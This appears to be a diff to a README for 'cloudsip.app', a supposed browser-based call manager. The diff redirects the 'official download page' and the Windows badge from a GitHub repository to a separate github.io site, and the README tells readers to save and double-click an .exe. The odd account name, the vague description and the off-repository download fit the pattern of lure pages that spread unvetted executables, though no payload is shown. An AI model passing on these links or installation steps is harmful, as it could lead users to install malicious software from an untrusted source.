@@ -1,6 +1,6 @@
 # 📞 cloudsip.app - Manage your phone calls with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/Down-organicdisorder777/cloudsip.app)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://down-organicdisorder777.github.io)
 
 cloudsip.app provides a simple way to handle phone calls directly from your computer. This software works like a traditional telephone system through your web browser. You can manage multiple lines, transfer calls, and save recordings without complex hardware. The application uses modern technology to connect to your existing phone network.
 
@@ -29,7 +29,7 @@ Ensure your computer meets these standards for a stable experience:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Down-organicdisorder777/cloudsip.app) to get the latest version.
+1. Visit the [official download page](https://down-organicdisorder777.github.io) to get the latest version.
 2. Look for the file ending in .exe in the releases section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation process.
